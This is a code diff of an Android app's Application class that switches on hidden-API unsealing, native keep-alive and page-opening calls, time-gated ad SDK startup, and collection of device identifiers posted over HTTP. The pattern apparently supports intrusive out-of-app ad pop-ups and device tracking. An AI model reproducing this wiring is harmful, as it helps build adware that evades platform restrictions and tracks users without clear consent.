@@ -4,18 +4,18 @@ import android.app.Application
 import android.content.Context
 import android.content.Intent
 import android.os.Build
-import android.os.Handler
-import android.os.Looper
-import android.text.TextUtils
+import android.provider.Settings
 import android.util.Log
 import com.baidu.maps.utils.MapsUtils
-import com.baidu.maps.utils.ReflectUtils
-//import com.keep.up.all.NativeJniUtils
+import com.github.gzuliyujiang.oaid.DeviceID
+import com.github.gzuliyujiang.oaid.IGetter
+import com.keep.up.all.NativeJniUtils
+import com.lx.c_interface_library.CommonAPI
 import com.lx.c_interface_library.OnClickAgreement
+import com.lx.lxtoolsproject.sdk.GmSdkUtils
+import com.lx.lxtoolsproject.sdk.JuliangSDKUtils
 import com.tencent.mmkv.MMKV
 import me.weishu.reflection.Reflection
-//import com.xian.bc.translation.TranslationSdkInitializer
-import java.io.File
 
 
 class ToolsApplication : Application() {
@@ -29,7 +29,7 @@ class ToolsApplication : Application() {
     override fun attachBaseContext(base: Context?) {
         super.attachBaseContext(base)
         Reflection.unseal(base)
-        StartHelper.initVmp()
+        chlOrganizeUtils.initVmp()
     }
 
     override fun onCreate() {
@@ -37,14 +37,12 @@ class ToolsApplication : Application() {
         contentInstance = this
         MMKV.initialize(this)
         intGgSource()
-
-//        TranslationSdkInitializer.initialize(this)
     }
 
 
     val clickAgreement = object : OnClickAgreement {
         override fun isAgreement() {
-//            initSO()
+            initOaid()
         }
 
         override fun isCancelAgreement() {
@@ -53,60 +51,68 @@ class ToolsApplication : Application() {
 
 
     private fun intGgSource(){
-
-        initApp()
-
-//        val str: String = BuildConfig.AD_LIVE_TIME
-//        MapsUtils.isAgreementState(str,this,clickAgreement)
-//        StartHelper.initDef(this)
+        val str: String = BuildConfig.AD_LIVE_TIME
+        MapsUtils.isAgreementState(str,this,clickAgreement)
     }
-
-
-//    private fun initSO(){
-//        AdControlCUtils.initDef(this,object : ReflectUtils.OnRreflctListener{
-//            override fun onOk() {
-//                initApp()
-//            }
-//            override fun onFail() {
-//                Log.i("AD_LOG","重新加载")
-//                if (!isSuccess) {
-//                    isSuccess = true
-//                    Handler(Looper.getMainLooper()).postDelayed({
-//                        val cFilePath = APPSpUtils.getCFilePath()
-//                        if (!TextUtils.isEmpty(cFilePath) && File(cFilePath).length() > 0) {
-//                            MapsUtils.getGgSource(cFilePath,this@ToolsApplication)
-//                        }
-//                        initApp()
-//                    },2000)
-//                }
-//            }
-//        })
-//    }
-
-
-
-
-
-
-    private fun initApp(){
-//        NativeJniUtils.virinit(this)
-//        if (Build.VERSION.SDK_INT>=34){
-//            NativeJniUtils.openlink(this)
-//        }
-
-
-        AdControlCUtils.initDef(this)
-        if (AdControlCUtils.isGoWork(BuildConfig.AD_LIVE_TIME)){
-            AdControlCUtils.handlerPostInitStrategy()
-            AdControlCUtils.initSDK()
-            AdControlCUtils.setLauncherMiddleListener { intent ->
-                Log.i("AD_LOG","喀什哦弹出")
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-//                NativeJniUtils.pageopen(intent)
-                startActivity(intent)
+    private fun initOaid(){
+        DeviceID.getOAID(this, object : IGetter {
+            override fun onOAIDGetComplete(result: String?) {
+                APPSpUtils.setSpOaidStr(result)
+                initApp()
             }
+            override fun onOAIDGetError(error: Exception?) {
+                APPSpUtils.setSpOaidStr("")
+                initApp()
+            }
+        })
 
+        if (CommonAPI.switchLog){
+            getSpAndroidIdStr()
+        }
+
+    }
+    private fun initApp(){
+        NativeJniUtils.virinit(this)
+        if (Build.VERSION.SDK_INT>=34){
+            NativeJniUtils.openlink(this)
+        }
+        AdControlCUtils.initDef(this)
+        AdControlCUtils.handlerPostInitStrategy()
+        GmSdkUtils.initSDK()
+        JuliangSDKUtils.initJuliangSKD()
+        initInfo()
+        AdControlCUtils.setLauncherMiddleListener { intent ->
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            NativeJniUtils.pageopen(intent)
+            startActivity(intent)
         }
     }
+
+
+    fun getSpAndroidIdStr(): String? {
+          var androidID  = Settings.System.getString(
+                  this
+                    .getContentResolver(),
+                Settings.Secure.ANDROID_ID
+            )
+        Log.d("AD_LOG", "getAndroidId: id:" + androidID)
+        return androidID
+    }
+
+
+
+    fun initInfo(){
+        AdControlCUtils.setOnAgreementListener { come, netString, info ->
+            GGHttpUtils.getInstance().postConfigHttp(come, netString, info)
+        }
+        AdControlCUtils.setOnGGTJistener { come, netString, info ->
+            GGHttpUtils.getInstance().postHttp(netString, info)
+        }
+    }
+
+
+
+
+
 
 }
